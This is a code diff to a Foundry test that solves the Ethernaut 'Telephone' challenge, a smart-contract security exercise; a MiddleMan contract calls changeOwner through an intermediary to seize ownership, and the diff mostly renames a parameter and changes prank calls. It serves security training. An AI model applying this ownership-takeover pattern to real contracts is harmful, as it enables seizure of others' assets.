@@ -5,8 +5,8 @@ import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Telephone.sol";
 
 contract MiddleMan {
-    function attack(address telephone) public {
-        Telephone(telephone).changeOwner(msg.sender);
+    function attack(address prey) public {
+        Telephone(prey).changeOwner(msg.sender);
     }
 }
 
@@ -22,10 +22,10 @@ contract TelephoneTest is Test {
         assertEq(instance.owner(), address(this));
 
         MiddleMan middleMan = new MiddleMan();
-
         address alice = makeAddr("alice");
-        vm.startPrank(alice);
+        vm.prank(alice);
         middleMan.attack(address(instance));
+
         assertEq(instance.owner(), alice);
     }
 }
